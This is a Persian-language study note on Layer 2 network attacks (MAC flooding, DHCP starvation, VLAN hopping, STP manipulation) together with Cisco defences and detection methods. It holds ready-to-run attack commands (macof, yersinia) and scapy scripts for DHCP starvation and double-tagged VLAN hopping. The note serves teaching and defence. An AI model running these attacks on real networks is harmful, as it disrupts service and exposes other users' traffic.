---
Episode: E2
Date: 2026-04-24T18:28:00
Title: Network Attacks Types
tags:
  - Networking
  - network_security
  - network_attacks
  - Network_Pentest
Categories:
  - Networking
  - Network Pentesting
  - Network Security
Is Finished?:
Practice Status:
Spend Time:
Tools:
banner:
banner_icon:
Home:
Previous Episode:
Next Episode:
---
-------
## Attack Types
### Mac Flooding
#### Description
- **وقتیکه حافظه سوئیچ لبریز میشود:**
	- سوئیچ‌ها برای تصمیم‌گیری درباره ارسال فریم، از جدول مک آدرس ها بنام Mac Table استفاده می‌کنند که این جدول اندازه مشخصی دارد.
	- در حمله MAC Flooding، مهاجم با ارسال حجم بالایی فریم با Mac Address های مـتفاوت، جدول Mac Table را پر و لبریز می‌کند و در نتیجه سوئیچ دیگر نمیتواند خدمات رسانی خود را انجام دهد.

- **چه اتفاقی می‌افتد؟**
	- وقتی Mac Table پر شد، سوئیچ دیگر نمی‌داند هر فریم را به کدام پورت بفرستد. در این حالت، سوئیچ مانند یک هاب عمل می‌کند و تمام ترافیک را به همه پورت‌ها ارسال می‌کند. 

- **در نتیجه:**
	- مهاجم می‌تواند ترافیک سایر دستگاه‌ ها را ببیند.(در واقع مهاجم به تمام ترافیک های شبکه دسترسی دارد.)
	- حریم خصوصی شبکه از بین می‌رود.
	- عملکرد شبکه و پهنای باند به شدت کاهش میابد(زیرا هر فریم برای تمامی کلاینت ها ارسال میشود)
#### Attack Implementation
1. **Tools - `macof in dsniff`**
	- برای پیاده سازی این حمله از ابزار `macof` در کالی لینوکس(و سایر لینوکس های دبیان) میتوان استفاده کرد، این ابزار درون مجموعه ابزار دیگری بنام `dsniff` قرار دارد که این مجموعه هم باید نصب شود.

```sh
#Install dsniff (Including macof)
sudo apt install dsniff

#Run Attack on eth0 Network Interface
sudo macof -i eth0

#Run Attack using Specific Packet Number
sudo macof -i eth0 -n 1000
```
#### Security Solution
1. **Port Security:**
	1. برای دفاع در برابر این حمله از ویژگی Port Security استفاده میکنیم. 
	2. مکانیزم Port Security حداکثر تعداد Mac Address های مجاز را برای هر پورت(اینترفیس) سوییچ مشخص میکند و در صورت تخلف پورت Shutdown(غیرفعال) میشود.
	3. بنابراین اگر ماشینی تعداد زیادی بسته را برای سوییچ ارسال کند، هیچ اثری بر روی سویچ ندارد زیرا که پس از تعداد مشخص شده، پورت مورد نظر برای مدت زمانی مشخص Disable میشود.
	4. در واقع ساده ترین و در عین حال موثرترین راهکار مقابله با این حمله Port Security میباشد.
	5. **نکته:** با استفاده از مکانیزم Port Security میتوانیم تمامی Mac Address هایی که به سوئیچ متصل میشوند را نیز ذخیره کنیم.

- **Implement Port Security in Cisco:**
```sh
#Select Interface
interface gigabitethernet0/1

#Enable Port Security
switchport mode access
switchport port-security

#Configure Port Security
#مشخص کردن حداکثر تعداد فریم های دریافتی مجاز
switchport port-security maximum 10

#در صورت تخلف پورت غیرفعال میشود
switchport port-security violation shutdown

#ذخیره مک آدرس های متصل شده بصورت خودکار
switchport port-security mac-address sticky
```
- **This Commands doing below jobs:**
	1. حداکثر 10 عدد Mac Address مجاز در هر پورت(یعنی 10 فریم در لحظه برای هر پورت سوییچ)
	2. در صورت تخلف، پورت غیرفعال می‌شود.
	3. تمامی Mac Address های متصل به طور خودکار ذخیره می‌شوند.
#### Attack Detection
میدانیم که Mac Address ها دارای فرمتی استاندارد هستند که این فرمت ها در اکثر موارد ثابت و قابل شناسایی هستند.
1. **Mac Flooding Detection in Cisco Switch's**
	1. برای شناسایی حمله Mac Flooding در سوئیچ های سیسکو باید جدول Mac Table را بررسی کنیم. 
	2. اگر درون این جدول مک آدرس هایی بی ربط، رندوم و با مقادیری پشت سرهم وجود داشت حمله Mac Flooding رخ داده است.
```sh

show mac address-table count
show port-security
```
2. **Mac Flooding Detection Using Wireshark**
	1. با استفاده از فیلتر وایرشارک زیر میتوانیم مک آدرس هایی که استاندارد نیستند و در واقع بوسیله `macoff` و ابزار هایی از این دست تولید میشوند را مشاهده کنیم.
```sh
eth.src[0] == 0x00 and eth.src[1] == 0x01
```
### DHCP Starvation Attack
#### Description
- **وقتی سرور DHCP دیگه آدرسی برای دادن ندارد:**
	- در شبکه‌ های مدرن، پروتکل DHCP (Dynamic Host Configuration Protocol) مسئول تخصیص خودکار IP و سایر تنظیمات به دستگاه‌ های شبکه است. 
	- اما این پروتکل ذاتاً ساده‌ لوح و سطحی طراحی شده و در واقع مکانیزم احراز هویت ندارد. 
	- این ضعف، زمینه‌ساز حمله‌ ای به نام DHCP Starvation می‌شود.(پر شدن IP Pool آیپی هایی که قرار است به دیوایس ها اختصاصی داده شوند)

- **مکانیزم کارکرد DHCP:**
	- این سرویس دارای دو قسمت DHCP Client و DHCP Server است.
	- در واقع Client تنظیمات را از Server دریافت میکند و اینکار با ارسال بسته هایی بنام DORA انجام میشود.
	- بسته های شامل بسته های زیر میباشند:
		- D: Discovery
			- از کلاینت به سرور: درخواست دریافت آیپی و تنظیمات
		- O: Offer
			- از سرور به کلاینت: پیشنهاد آیپی و تنظیمات
		- R: Request
			- از کلاینت به سرور: قبول کردن پیشنهاد و درخواست آن آیپی ها و تنظیمات
		- A: Acknowledge 
			- از سرور به کلاینت: قبول درخواست کلاینت و ارسال آیپی و تنظیمات مربوط برای کلاینت
	- نکته: IP Pool: سرور DHCP آیپی و تنظیمات را از IP Pool برمیدارد که توسط ادمین تنظیم شده است و دارای رنجی از آیپی ها به همراه تنظیمات DNS, Gateway, Route, ... میباشد.

- **مکانیسم حمله:**
	- مهاجم با ارسال حجم بالایی درخواست DHCP Discover (با استفاده از MAC آدرس‌های جعلی)، تمام آدرس‌ های IP موجود در محدوده DHCP یا همان DHCP IP Pool را اشغال می‌کند. 
	- حمله DHCP Starvation در لایه دوم شبکه رخ میدهد.

- **نتیجه حمله:** 
	- دستگاه‌های درون شبکه دیگر نمی‌توانند از DHCP سرور IP دریافت کنند.
	- شبکه دچار اختلال در اتصال می‌شود.
	- در سناریوی پیشرفته‌ تر، مهاجم می‌تواند DHCP Server جعلی خود را راه‌اندازی کند؛ به این حمله جعل DHCP یا DHCP Spoofing میگویند.
#### Attack Implementation
##### Using Kali Linux - `yersinia`
در کالی لینوکس با استفاده از ابزار `yersinia` میتوانیم این نوع از حمله را پیاده سازی کنیم:
```sh
#Install Tool
sudo apt install yersinia

#Run Attack in Local Network(LAN) on eth0
sudo yersinia dhcp -attack 1 -interface eth0

```
##### Using Python - `scapy`
###### Code
```python
from scapy.all import *
import random
import time

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )

def dhcp_starvation(iface="eth0", dstMac="ff:ff:ff:ff:ff:ff"):
    for _ in range(1000):
        mac = random_mac()
        discover = Ether(src=mac, dst=dstMac) / \
                   IP(src="0.0.0.0", dst="255.255.255.255") / \
                   UDP(sport=68, dport=67) / \
                   BOOTP(chaddr=mac) / \
                   DHCP(options=[("message-type", "discover"), "end"])
        sendp(discover, iface=iface, verbose=False)
        time.sleep(0.01)

#Run Attack
dhcp_starvation(iface="eth0")
```
###### Code Description
1. **Libraries:**
	1. `scapy.all`: کتابخانه قدرتمند برای ساخت، دستکاری و جعل بسته‌ های شبکه.
	2. `random`: برای تولید مک آدرس‌ های تصادفی.
	3. `time`: برای ایجاد تأخیر بین ارسال بسته‌ها.
2. **`random_mac()` Function:**
    1. این فانکشن Mac Address های ساختگی با پیشوند `02:` تولید می‌کند.
    2. این پیشوند نشان‌دهنده یک MAC آدرس محلی (locally administered) است و استاندارد است بنابراین در Monitoring هم به سادگی شناسایی نمیشود.
3. **`dhcp_starvation(iface="eth0")` Function:**
	1. یک حلقه 1000 تایی اجرا می‌کند (تلاش برای ارسال 1000 درخواست).
	2. **در هر تکرار:**
		1. یک Mac Address تصادفی جدید تولید میشود. `mac = random_mac()`
		2. بسته DHCP Discover را با استفاده از عملگر `/` در `Scapy` می‌سازد. Scapy لایه‌ های پروتکل را روی هم سوار می‌کند، مانند TCP/IP
4. **`discover = ` Create Discover Packet Description:**
	1. `Ether`: Create Layer 2
		1. لایه 2 با MAC مبدأ(جعلی که خودمان ساختیم) و مقصد Broadcast.
		2. در اینجا به جای مقصد Broadcast میتوانیم MAC Address دستگاه مقصد را وارد کنیم.
		3. برای اینکار کافیست در هنگام فراخوانی فانکشن پارامتر `dstMac` را با مک آدرس مقصد حمله مقدار دهی کنیم.
	2. `IP`: Create Layer 3
		1. لایه 3 با IP مبدأ `0.0.0.0` (چون هنوز IP نداریم) و مقصد Broadcast.
		2. نکته: چون حمله در لایه 2 است و در واقع قبل از دریافت IP از DHCP Server انجام میشود دیوایس هنوز آیپی ندارد.
	3. `UDP`: Layer 4 with Source/Destination Port
		1. پورت 68: DHCP Client
		2. پورت 67: DHCP Server - مربوط مقصد
	4. `BOOTP`:
		1. اضافه کردن پروتکل Bootstrap که DHCP روی آن سوار است.
		2. مک آدرس ورودی هم مک جعلی تولید شده توسط خودمان است که در واقع DHCP Client است.(`chaddr`)
	5. `DHCP`:
		1. اضافه کردن لایه DHCP با آپشن `message-type=discover` 
		2. در اینجا مشخص میکنیم که بسته Discover DHCP باید ارسال شود.
	6. `Note: \ and / Characters`:
		1. `/` در Scapy برای سوار کردن لایه های روی همدیگر از `/` استفاده میکنیم.
		2. `\` این کاراکتر بنام Line Continuation Character است و به مفسر پایتون می‌گوید که خط فعلی در خط بعدی ادامه دارد و این دو خط باید به عنوان یک خط در نظر گرفته شوند.
		3. نکته: بجای `\` میتوان کل خطوط واحد را میان `()` گذاشت. یعنی به شکل زیر:
5. **`sendp(...)` Send Discovery Packet on Layer 2:**
	1. بسته ساخته‌ شده را در **لایه 2 شبکه (Data Link)** روی اینترفیس مشخص‌ شده `iface` ارسال می‌کند. 
	2. مقدار `verbose=False` از چاپ جزئیات جلوگیری می‌کند.
6. **`time.sleep(0.01)` Delay between Send each Packets:**
	1. بین هر ارسال بسته، 10 میلی‌ثانیه صبر می‌کند تا نرخ ارسال بسته‌ها کنترل شود و سرور DHCP غرق نشود و فرصت پاسخگویی داشته باشد.
	2. اینکار شناسایی بسته را نیز سخت تر میکند.
```python
discover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac) /
            DHCP(options=[("message-type", "discover"), "end"]))
```
#### Security Solutions
1. **Port Security**
	1. محدود کردن تعداد MAC آدرس‌های مجاز در هر پورت، پیکربندی بصورت زیر:
	2. `switchport port-security maximum 5`
```sh
#Select Interface
interface gigabitethernet0/1

#Enable Port Security
switchport mode access
switchport port-security

#Configure Port Security
#مشخص کردن حداکثر تعداد فریم های دریافتی مجاز
switchport port-security maximum 10

#در صورت تخلف پورت غیرفعال میشود
switchport port-security violation shutdown

#ذخیره مک آدرس های متصل شده بصورت خودکار
switchport port-security mac-address sticky
```
2. **DHCP Snooping:**
	1. روتر فقط به DHCP Server های مجاز، اجازه پاسخ‌گویی می‌دهد.
	2. در واقع جدولی از MAC و IP های معتبر ساخته میشود و DHCP بر اساس آن کار میکند.

```sh
#Configuration in Cisco Switchs
ip dhcp snooping
ip dhcp snooping vlan 1-100

#Trust only for Port Connect to DHCP Server
interface gigabitethernet0/1
ip dhcp snooping trust
```

3. **Enable Rate Limiting for DHCP Discovery:**
	1. محدود کردن تعداد بسته‌ های DHCP دریافتی در هر پورت 
4. **802.1X (Network Access Control):**
	1. احراز هویت دستگاه‌ ها قبل از تخصیص IP
5. **Active Monitoring:**
	1. استفاده از ابزارهایی مثل `dhcpdump` یا `Wireshark` یا `tcpdump` برای نظارت بر ترافیک های DHCP
```sh
#Monitor DHCP Traffics using dhcpdump
sudo dhcpdump -i eth0

#Monitor DHCP Traffics using tcpdump
sudo tcpdump -i eth0 port 67 or port 68 -n
```
#### Attack Detection
1. افزایش ناگهانی درخواست‌ های DHCP Discover از MAC آدرس‌ های متفاوت  
2. تمام شدن سریع IP Pool  
3. شکایت کاربران از عدم اتصال به شبکه
#### Conclusion
حمله DHCP Starvation یک حمله ساده اما مؤثر در لایه ۲شبکه است.
پیاده‌سازی ترکیبی از Port Security، DHCP Snooping و Rate Limiting می‌تواند این تهدید را به طور کامل خنثی کند.
به یاد داشته باشید که امنیت شبکه، یک لایه نیست؛ ترکیبی از تنظیمات صحیح در لایه‌های مختلف است.
### VLAN Hopping(Double Tagging Type)
#### Description
##### VLAN & Requires Description
1. **What is VLAN?**
	1. خیلی ها فکر میکنن VLAN نوعی دیوار چینی بین شبکه هاست. این اشتباهه و VLAN فقط یه تگ نرم افزاری رو پکت است.
	2. مکانیزم VLAN در واقع برای تقسیم بندی شبکه و ایجاد زیر شبکه هایی با رنج Subnet متفاوت درون یک شبکه اصلی است. 
	- مکانیزم VLAN تقسیم بندی شبکه را با استفاده از Tag هایی که به بسته ها میچسباند انجام میدهد.
2. **What is Native VLAN?**
	1. شماره VLAN پیشفرض است که اگر بسته ای در شبکه هیچ VLAN Tags نداشته باشد همیشه به Native VLAN منتقل میشود.
	2. شماره Native VLAN بصورت پیشفرض 1 است اما در سوئیچ های امروزی امکان تغییر آن وجود دارد.
	3. در واقع تنها VLAN ای روی ترانک است که فریم‌هایش بدون تگ ارسال می‌شوند (پیش‌فرض VLAN 1). 
	4. این کار برای حفظ سازگاری با دستگاه‌ها یا پروتکل‌های قدیمی (مانند CDP, VTP, STP) انجام می‌شود.
3. **What is Trunk?**
	1. عملیات Trunk یک لینک نقطه‌ به‌ نقطه (Point-to-Point) بین دو دستگاه شبکه (معمولاً سوییچ-سوییچ یا سوییچ-روتر) است که میتواند ترافیک **بیش از یک VLAN** را به طور همزمان عبور می‌دهد.
	2. یعنی بوسیله Trunk میتواند دیتای VLAN 10 و VLAN 20 را از یک کابل مشترک عبور دهد بدون اینکه مخلوط شوند.
4. **What is Access Port?**
	1. حال به پورت هایی در هر دو سوئیچ که ارتباط Trunk را برقرار میکند، Access Port گفته میشود.
5. **What is Tagging?**
	1. سوییچ مبدأ یک فیلد 4 بایتی به هدر هر فریم اضافه می‌کند که شامل یک **VLAN ID** است که اندازه آن نیز 12 بیت (1 تا 4094) میباشد. به این عمل "Tagging" می‌گویند.
	2. این فیلد 4 بایتی مقادیری بین 1 تا 4094 میتواند داشته باشد.
6. **What is External Tag & Internal Tag?**
	1. هر فریم که در ارتباط Trunk ارسال میشود دارای یک تگ است.
	2. در پورت Access سوئیچ مبدا تگ خارجی External Tag بررسی میشود.
	3. در پورت Access سوئیچ مقصد نیز تگ داخلی Internal Tag بررسی میشود.
##### VLAN Hopping(Double Tagging Type) Description
این حمله یک باگ در نحوه عملکرد سخت‌افزاری سوییچ‌ هاست، نه یک آسیب‌پذیری نرم‌افزاری. مهاجم با قرار دادن دو تگ 802.1Q در یک فریم، لایه دسترسی را فریب می‌دهد.
1. **Attack Requires:**
	1. این حمله فقط وقتی کار میکند که:
	2. سوئیچ در حالت Trunk باشد. یعنی ارتباط بین دو سوئیچ از طریق Trunk برقرار باشد.
	3. ویژگی Native VLAN رو فعال باشد.(یعنی مهاجم باید به پورتی متصل باشد که در همان VLAN ای قرار دارد که Native VLAN ترانک است که معمولاً VLAN 1 است.)
2. **When Attack Happens?**
	1. اگر سوئیچ درست تنظیم نشده باشد، میشه Tag های شخصی خودمون رو به پکت ها بچسبونیم و اونها رو به داخل شبکه بفرستیم.
	2. حمله VLAN Hopping در نوع Double Tagging آن هم دقیقا از همین ضعف چسباندن Tag های دلخواه به بسته ها استفاده میکند.
3. **VLAN Hopping | Double Tagging Mechanism:**
	1. ابتدا باید فریمی را با 2 تگ 802.1Q بسازیم:
		1. تگ داخلی: شامل VLAN مقصد (مثلاً VLAN 2 که VLAN مدیریته یا VLAN 20 که بخش مالی است)  
		2. تگ خارجی: Native VLAN (مثلاً VLAN 1)
	2. حال در سمت مبدا خودمان وقتی فریم از پورت Access وارد سوئیچ می‌شود، سوییچ تگ Native خود را می‌خواند و چون تگ خارجی با Native VLAN ترانک یکی است، سوییچ طبق استاندارد تگ خارجی را جدا میکند و فریم را بدون تگ وارد کانال ترانک می‌کند.
	3. اما فریم همچنان یک تگ دیگر(تگ داخلی) نیز دارد، بنابراین در سمت مقصد سوییچ مقابل این فریم را دریافت می‌کند، تگ داخلی VLAN 2 را می‌بیند و آن را به پورت‌های VLAN 2 (بخش مدیریت) تحویل می‌دهد.
##### VLAN Hopping Using DTP(Dynamic Trunking Protocol) - Advance
1. **What is DTP(Dynamic Trunking Protocol)?**
	1. یک پروتکل اختصاصی سیسکو در لایه ۲ که وظیفه مذاکره (Negotiation) خودکار برای تبدیل یک لینک به حالت Trunk بین دو سوییچ را دارد.
2. **VLAN Hopping Using DTP Description:**
	1. پروتکل DTP به طور پیشفرض در اکثر سوئیچ های سیسکو روشن است.
	2. بنابراین میشه با یه پکت ساده به سوئیچ گفت «من یه سوئیچ دیگه‌ام، بیا باهام trunk کن». 
	3. بنابراین بعدش کل ترافیک از تمام VLANها میاد سمت ما.
#### Attack Implementation
##### VLAN Hopping Double Tagging Implementation
###### Simple VLAN Hopping Double Tagging using Python
برای پیاده سازی این حمله از `scapy in Python` استفاده میکنیم:
```python
from scapy.all import *

#Packet with two 802.1Q(Dot1Q) Layer
packet = Ether() / Dot1Q(vlan=1) / Dot1Q(vlan=2) / IP(dst="192.168.2.1") / ICMP()

sendp(packet, iface="eth0")
```
با ارسال این پکت، اگر Native VLAN سوئیچ 1 باشد، پکت حتما به VLAN 2 میرود. حتی اگه خودمون داخل VLAN 1 باشیم.
###### Advance VLAN Hopping Double Tagging using Python
- [[E10-Codes-Network Attacks Types#Advance VLAN Hopping Double Tagging using Python]]
###### Advance VLAN Hopping Double Tagging using Python + Show Response
- [[E10-Codes-Network Attacks Types#Advance VLAN Hopping Double Tagging using Python + Show Response]]
###### VLAN Hopping Double Tagging using Python using Yersinia
1. Run Yersinia on Graphic Mode
	1. `sudo yersinia -G`
2. Select 802.1Q
3. Click on Double Tagging
4. Set VLAN Numbers
5. Launch Attack
ممکن است در بعضی از مواقع Yersinia کار نکند که در اینجا Scapy تنها راه حل قطعی پیاده سازی این نوع از حملات است.
##### VLAN Hopping Using DTP Implementation
###### VLAN Hopping Using DTP Implementation - Using Yersinia
ابزار Yersinia یک ابزار قدرتمند خط فرمانی و گرافیکی برای حملات لایه 2 است. استفاده از آن برای DTP abuse و Double Tagging بسیار ساده است.
1. **Run Yersinia in Graphic Mode:**
```sh
sudo yersinia -G
```
2. **Now Open `DTP` Section and Set Options:**
    - Mode: Trunk
    - Claim: Desirable
    - Click on `Launch`
3. **What Happen Now?**
	- سوییچ سیسکو که روی حالت `dynamic auto` است، فوراً پورت را Trunk می‌کند. تمام VLAN ها اکنون روی میز مهاجم هستند.
- **Note: Yersinia Problems in DTP Attack and New Version of Linux:**
	1. کتابخانه `libpcap` و درایورهای جدید گاهی اجازه تزریق فریم‌های خام DTP را به راحتی نمی‌دهند. ممکن است Yersinia از ارسال بسته سر باز بزند (Protocol dissector issue).  
	2. آلترناتیو تست‌ شده: ابزار `dtp-tools` یا استفاده از Scapy با سوکت‌های RAW برای DTP (که آن هم پیچیده است چون باید MAC مبدأ 01:00:0c:cc:cc:cc باشد).  
```sh
#Run Yersinia on Interactive Mode
yersinia -I
#Then Select DTP -> Enable Trunk
```
###### VLAN Hopping DTP - Python Simplex(One Way) 
- [[E10-Codes-Network Attacks Types#VLAN Hopping - DTP(Simplex Version)]]
###### VLAN Hopping DTP - Python Full Duplex(Two Way) 
- [[E10-Codes-Network Attacks Types#VLAN Hopping - DTP(Full Duplex Version)]]
#### Security Solutions
1. **VLAN Hopping Double Tagging**
	1. **Change Native VLAN to Unused VLAN then Block it:**
	- اول انتقال Native VLAN به یک VLAN استفاده‌ نشده(مثلاً VLAN 999) 
	- سپس بلاک ترافیک Native VLAN 
	2. **Force Tagging for Native VLAN on Trunk:**
		1. با استفاده از دستور زیر تگ کردن Native VLAN روی ترانک را اجباری کنید:
			1. `vlan dot1q tag native`
	3. **Filter Two Layers Dot1Q:**
	4. قبول نکردن تگ های داخلی رو روی پورت‌ های اکسس(فیلتر کردن Dot1Q دو لایه)
	5. **Use VLAN Access Control Lists (VACL):**
		1. استفاده از VLAN Access Control Lists (VACL) که ترافیک های مشکوک را بلاک میکند.  
2. **VLAN Hopping Using DTP:**
	1. **None Negotiate Trunk:**
		1. اصلی ترین راهکار امنیت در برابر این حمله غیرفعال کردن حالت مذاکره است. برای اینکار از دستورات زیر استفاده میکنیم:
			1. `switchport mode access`
			2. `switchport nonegotiate`
	2. **Define Private Native VLAN or Disable Native VLAN:**
		1. استفاده از Native VLAN فقط در حالت خصوصی و یا غیر فعال کردن آن
	3. **Define Allowed VLAN for Trunk:**
		1. تعریف VLAN های مجاز با استفاده از دستور زیر:
			1. `switchport trunk allowed vlan`
	4. **Use PVLAN (Private VLAN)(Only in High Level Switches):**
		1. فعال کردن PVLAN (Private VLAN) که ارتباط بین دیوایس های درون یک VLAN را نیز مسدود میکند.
		2. این ویژگی فقط در سوئیچ های رده بالا Cisco وجود دارد.
#### VLAN Hopping | Double Tagging in Low Level/Home Switches
1. بعضی سوئیچ‌ های ارزون قیمت (مثل تی‌پی‌لینک، دی‌لینک) اصلاً این حملات رو نمیشناسن.
2. بنابراین با یه پکت ساده میتونیم به هر VLAN که دلمان میخواد وارد شویم. 
3. حتی بعضی از سوئیچ‌های نیمه‌ حرفه‌ای هم قابلیت Native VLAN رو درست مدیریت نمیکنند.
4. بنابراین اگر یه شرکت از سوئیچ‌های خانگی استفاده می‌کند و VLAN هم دارد نفوذ به آن راحت تر از خوردن آب است.
### Spanning Tree Protocol Attacks(STP Manipulation & BPDU Storm)
#### Description
##### Requisite Description
1. **STP Protocols:**
	1. **هدف اصلی:** جلوگیری از Loop در توپولوژی‌ های Redundant (اضافی) شبکه با غیرفعال کردن منطقی برخی پورت‌ها.
	2. **مراحل الگوریتم STP (3 مرحله):**
		1. **مرحله 1: انتخاب Root Bridge (یک عدد برای کل شبکه)**
			- همه سوییچ‌ ها پیشفرض با Priority = 32768 + MAC شروع می‌کنند.
			- کمترین Bridge ID برنده می‌شود.
			- دیوایس Root Bridge پورت‌ های خودش را Designated Port می‌کند.
		2. **مرحله 2: انتخاب Root Port (یک عدد برای هر سوییچ غیر Root)**
			- هر سوییچ یک پورت را به عنوان نزدیک ترین مسیر به Root انتخاب می‌کند.
			- معیار: کمترین Path Cost به Root.
			- پورت Root Port ترافیک به سمت Root را Forward می‌کند.
		3. **مرحله 3: انتخاب Designated Port (یک عدد برای هر Segment)**
			- در هر سگمنت، سوییچی که کمترین Cost به Root دارد، پورت خود را Designated می‌کند.
			- پورت های Designated Port ترافیک از Root را Forward می‌کند.
2. **Port Status in STP:**
	1. **Blocking (Discarding):**
		1. پیام های BPDU را دریافت می‌کنند اما داده ای Forward نمی‌کنند(Loop را می‌شکند).
	2. **Listening:** 
		1. حالت آماده‌ سازی برای Forwarding.
	3. **Learning:** 
		1. یادگیری MAC اما بدون Forward.
	4. **Forwarding:**
		1. ارسال و دریافت عادی.
3. **Differs Between STP, RSTP & MSTP:**
	1. STP (802.1D): 
		1. همگرایی 50 ثانیه - یعنی شبکه برای 50 ثانیه در هر بار همگرایی قطع میشود.
	2. RSTP (802.1w): 
		1. همگرایی زیر 1 ثانیه - یعنی شبکه قطعی نزدیک به صفر در هر بار همگرایی
	3. MSTP (802.1s):
		1. پشتیبانی از چندین Instance(نمونه) برای VLAN های مختلف.
4. **What is BPDU Packets and BPDU Usage?**
	1. بسته های **BPDU (Bridge Protocol Data Unit)** پیام‌های کنترلی هستند که سوییچ‌ ها برای اجرای پروتکل STP بین خود مبادله می‌کنند.
	2. **کارکرد اصلی:**  
		1. **انتخاب Root Bridge:** سوییچ با کمترین Bridge Priority (پیش‌فرض 32768 + MAC) رهبر می‌شود.  
		2. **محاسبه بهترین مسیر:** هر سوییچ کمترین Cost(هزینه) به Root را محاسبه می‌کند.  
		3. **تشخیص Loop:** پورت‌های اضافی را Block می‌کند و از Loop جلوگیری میکند(مثلا اگر دو پورت سوئیچ بصورت فیزی به یکدیگر متصل شوند Loop رخ میدهد)
		4. **اعلان تغییرات:** با TCN، همگرایی شبکه را سریعتر می‌کند.
	3. **مشخصات فنی:**
		1. **1. STP Multicast MAC Address:**
		2. مقصد: `01:80:c2:00:00:00` (آدرس Multicast مخصوص STP)
		3. **Send Frequency:**
			1. فرکانس ارسال: هر ۲ ثانیه توسط Root Bridge
		4. **Max Age:**
			1. 20 ثانیه (اگر BPDU نرسد، توپولوژی دوباره محاسبه می‌شود)
5. **Type of BPDU:**
	1. **Configuration BPDU (Type 0x00):**
		1. توسط Root Bridge تولید و توسط بقیه سوییچ‌ها Forward می‌شود. شامل اطلاعات توپولوژی (Bridge ID، Root Path Cost، Port ID).
	2. **TCN BPDU (Type 0x80):**
		1. هنگام تغییر توپولوژی (بالا/پایین آمدن لینک) ارسال می‌شود تا جدول MAC سریعتر منقضی شود.
6. **Reconvergence Mode in Network:**
	1. حالت Reconvergence(همگرایی مجدد) فرآیندی است که در آن STP بعد از یک تغییر در توپولوژی (قطع شدن کابل، اضافه شدن سوییچ جدید، خرابی لینک)، دوباره مسیرهای بدون Loop را محاسبه می‌کند. در این حالت شبکه چند ثانیه قطع میشود.
	2. **مراحل Reconvergence:**
		1. **تشخیص تغییر:** سوییچ از رسیدن BPDU متوقف می‌شود (Max Age = 20 ثانیه).
		2. **انتشار TCN:** سوییچ تغییر را به Root Bridge گزارش می‌دهد. 
		3. **محاسبه مجدد:** Root Bridge توپولوژی جدید را محاسبه می‌کند.
		4. **انتشار BPDU جدید:** اطلاعات جدید به همه سوییچ‌ها می‌رسد.
		5. **تغییر وضعیت پورت‌ها:** پورت‌ها از Blocking → Listening → Learning → Forwarding عبور می‌کنند.
	3. **مدت زمان قطعی (STP - 802.1D):**
		1. Max Age: 20 Seconds
		2. Listening: 15 Seconds
		3. Learning: 15 Seconds
		4. Total: 50 Seconds - شبکه 50 ثانیه قطع میشود.
	4. **نکته امنیتی:** 
		1. مهاجم با ارسال BPDU جعلی می‌تواند باعث Reconvergence مداوم و در نتیجه قطعی مکرر 50 ثانیه‌ ای شبکه و از کار افتادن شبکه شود (DoS). 
		2. به این حمله Spanning Tree Protocol Attack or STP Manipulation Attack
	5. **پروتکل RSTP (802.1w):** زمان قطع شدن و تغییر شبکه را به زیر 1 ثانیه کاهش می‌دهد.
##### STP Manipulation & BPDU Storm Attack Description
1. **STP(Spanning Tree Protocol) for Attack**
	1. خیلی ها فکر میکنن سوئیچ از هاب امن تره، این مورد تا جایی درسته اما کامل نه.
	2. پروتکل STP برای جلوگیری از Loop در شبکه ارائه شده. 
	3. اما STP در واقع ریشه یه حفره‌ است. برای نفوذ کافیه یک بسته Config BPDU جعلی به سوئیچ ارسال بشه که با اینکار میشه ترافیک سوئیچ را برداشت.
2. **STP Manipulation Attack Description:**
	1. **هدف:** تبدیل شدن به Root Bridge.
	2. **روش:** ارسال پیام های BPDU جعلی با Priority خیلی پایین (مثلاً 0) - بنابراین دیوایس ما Root Bridge میشود.
	3. **تأثیر:** مهاجم Root Bridge می‌شود و کل ترافیک از او عبور می‌کند (MITM).
	4. **تعداد بسته های مورد نیاز:** کم و هدفمند (چند بسته در هر 2 ثانیه).
	5. **تشخیص:** سوییچ جدید با Priority غیر عادی در شبکه.
	6. **پس از حمله چه میشود؟**
		1. سوئیچ‌ها شروع میکنن به باز و بسته کردن پورت‌ها
		2. ترافیک شبکه گم میشه
		3. در بهترین حالت شبکه در یک reconvergence وارد میشه و اگر پروتکل STP باشه بصورت مداوم قطعی های 50 ثانیه ای در شبکه رخ میدهد.
	7. **نکته:** نام دیگر این حمله STP Root Bridge Hijacking است.
3. **BPDU Storm Attack Description:**
	1. **هدف:** ایجاد Reconvergence مداوم و از کار انداختن شبکه(DoS)
	2. **روش:** ارسال حجم عظیم BPDU با TCN و اعلام وجود تغییرات جعلی در توپولوژی.
	3. **تأثیر:** قطعی های 50 ثانیه‌ای مکرر، مصرف CPU سوییچ‌ها.(مصرف CPU در 100%)
	4. **تعداد بسته:** بسیار زیاد (سیل آسا).
	5. **تشخیص:** حجم غیرعادی BPDU در شبکه.
4. **Conclusion, Differs between STP Manipulation & BPDU Storm:**
	1. هر دو حمله STP Manipulation و BPDU Storm بر روی پروتکل STP و با استفاده از پیام های BPDU انجام میشود اما متفاوت هستند.
	2. در STP Manipulation دیوایس Root Bridge رهبر را عوض میکنیم(نوع حمله MITM)
	3. در BPDU Storm شبکه را بصورت کلی از کار می اندازیم(نوع حمله DoS)
	4. **تشبیه:** STP Manipulation مثل "کودتا" است (جایگزینی رهبر)، اما BPDU Storm مثل "شورش خیابانی" است (هرج و مرج مداوم). 
5. **How Implementation:**
	1. این حملات را با یک ابزار ساده مثل `tcpreplay` یا حتی اسکریپت پایتون با `scapy`، میتونیم انجام بدهیم.
##### STP Attacks in Real Scenario
1. **STP Attacks in VMs**
	1. در محیط‌ های مجازی (مثل داکر یا vmware) که معمولاً کنترل روی BPDU ندارن، این حمله با یک لپ‌ تاپ معمولی هم قابل اجراست. 
	2. فقط کافیه به پورت اکسس یک سوئیچ معمولی وصل شد (که معمولاً BPDU فیلتر نداره) و بسته BPDU را ارسال کنیم.
2. **STP Manipulation in Industry Environments:**
	- در محیط‌ های صنعتی یا شبکه‌های قدیمی، حتی بعضی سوئیچ‌ها BPDU Guard هم ندارن.
	- اونجا کافیه یه BPDU ارسال کنید تا کل شبکه از کار بیفته.
